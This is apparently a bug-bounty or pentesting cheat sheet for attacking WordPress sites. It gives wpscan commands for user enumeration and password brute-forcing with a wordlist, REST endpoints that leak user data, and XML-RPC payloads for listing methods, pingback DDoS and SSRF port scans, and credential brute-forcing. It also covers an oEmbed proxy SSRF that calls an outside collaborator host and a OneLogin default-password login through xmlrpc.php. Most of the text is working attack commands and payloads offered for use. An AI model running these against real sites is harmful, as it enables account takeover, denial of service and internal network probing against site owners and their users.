#### TOOLS 
- wpscan
  ````
  wpscan --url https://blog.com --enumerate u   ==> user enumeration
  wpscan  -U users.txt -P password.txt  --url https://blog.com
  ````

#### WP-USER ENUMERATION
This issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff
````
- wp-json/wp/v2/users/
- wp-json/wp/v2/pages  ===> could leak ip addresses
- ?rest_route=/wp/v2/users
You will see json data with user info in response
````
### Bruteforce for password
`wpscan --url http://10.10.23.231/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt  --max-threads 100`

#### xmlrpc.php
send the post request with the following data
- LIST ALL THE METHODS
````
                <?xml version="1.0" encoding="utf-8"?>
                <methodCall> 
                <methodName>system.listMethods</methodName> 
                <params></params> 
                </methodCall>

````
- Check the pingback.ping method is there or not. Perform DDOS
````
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
````
- Perform SSRF (Internal PORT scan only)
````
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
````
- Bruteforce login credentials
  ```
  <methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
  <param><value>admin</value></param>
  <param><value>pass</value></param>
  </params>
  </methodCall>
  ```
#### CREATE DATABASE
- /wp-admin/setup-config.php?step=1  ===> may give access to create new database if they forgot to configure the database 
 #### Log files exposed
- wp-content/debug.log

#### ssrf through endpoint
- Try to access https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net and the Worpress site may make a request to you.

 ### Is the wordpress using onelogin plugin to allow saml based login? The plugin by default block login using wp-login.php?normal=1 but attacker can use xmlrpc.php to login.
 When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password @@@nopass@@@. This wouldn't be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn't. Then try login using those credentials via xmlrpc.php
  ```
  attacker can create new post and can do many other functions too
  check out this hackerone report==> https://hackerone.com/reports/138869
  ```
